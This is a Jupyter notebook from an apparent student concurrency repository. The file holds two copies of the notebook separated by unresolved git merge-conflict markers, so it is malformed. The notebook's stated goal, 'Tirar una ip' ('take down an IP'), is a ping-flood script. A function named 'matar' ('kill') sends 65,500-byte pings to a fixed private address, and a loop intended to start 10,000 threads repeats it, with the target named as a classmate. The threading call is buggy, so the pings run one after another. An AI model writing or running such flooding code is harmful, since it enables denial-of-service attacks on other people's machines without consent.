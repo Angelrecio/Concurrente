<<<<<<< HEAD
{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "5c0b9c36-9fbb-4558-9f99-10e8c09b88dc",
   "metadata": {},
   "source": [
    "## Tirar una ip "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "b1436e8e-8aed-4149-bd55-e35bc00bb265",
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading, os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "a6ebab79-ca97-469a-90c2-b865b3583cc6",
   "metadata": {},
   "outputs": [],
   "source": [
    "numero_de_veces_hasta_matar_compañero = 10000\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "1e81186d-6711-4030-bfff-55aa04c59163",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar():\n",
    "    res_ =os.popen(\"ping 10.34.81.2 -l 65500 -w 1 -n 1\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "63922635-15f4-496d-aa30-9af8161d8f90",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<os._wrap_close at 0x7ff65dab49d0>"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    " os.popen(\"ping 10.34.81.2 -l 65500 -w 1 -n 1\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51a7ba78-d11c-45f7-b97b-b292e4b46a7b",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range (numero_de_veces_hasta_matar_compañero):\n",
    "    threading.Thread(target= matar()).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "fec08619-1f5b-4467-9c5c-364c5fff4a21",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "bb39b0fd-8b84-4b6c-b2c2-09633db7f960",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<function nt.cpu_count()>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.cpu_count"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ff270a6-1d3d-4b01-a727-89fb5a5f903e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
=======
{"metadata":{"kernelspec":{"display_name":"Python 3","language":"python","name":"python3"},"language_info":{"codemirror_mode":{"name":"ipython","version":3},"file_extension":".py","mimetype":"text/x-python","name":"python","nbconvert_exporter":"python","pygments_lexer":"ipython3","version":"3.7.8"}},"nbformat_minor":5,"nbformat":4,"cells":[{"cell_type":"markdown","source":"## Tirar una ip ","metadata":{},"id":"5c0b9c36-9fbb-4558-9f99-10e8c09b88dc"},{"cell_type":"code","source":"import threading, os","metadata":{"trusted":true},"execution_count":14,"outputs":[],"id":"b1436e8e-8aed-4149-bd55-e35bc00bb265"},{"cell_type":"code","source":"numero_de_veces_hasta_matar_compañero = 10000\n","metadata":{"trusted":true},"execution_count":15,"outputs":[],"id":"a6ebab79-ca97-469a-90c2-b865b3583cc6"},{"cell_type":"code","source":"def matar():\n    res_ =os.popen(\"ping 10.34.81.2 -l 65500 -w 1 -n 1\")","metadata":{"trusted":true},"execution_count":16,"outputs":[],"id":"1e81186d-6711-4030-bfff-55aa04c59163"},{"cell_type":"code","source":" os.popen(\"ping 10.34.81.2 -l 65500 -w 1 -n 1\")","metadata":{"trusted":true},"execution_count":17,"outputs":[{"execution_count":17,"output_type":"execute_result","data":{"text/plain":"<os._wrap_close at 0x7ff65dab49d0>"},"metadata":{}}],"id":"63922635-15f4-496d-aa30-9af8161d8f90"},{"cell_type":"code","source":"for i in range (numero_de_veces_hasta_matar_compañero):\n    threading.Thread(target= matar()).start()","metadata":{"trusted":true},"execution_count":null,"outputs":[],"id":"51a7ba78-d11c-45f7-b97b-b292e4b46a7b"},{"cell_type":"code","source":"","metadata":{},"execution_count":null,"outputs":[],"id":"fec08619-1f5b-4467-9c5c-364c5fff4a21"},{"cell_type":"code","source":"","metadata":{},"execution_count":null,"outputs":[],"id":"bb39b0fd-8b84-4b6c-b2c2-09633db7f960"}]}
>>>>>>> main
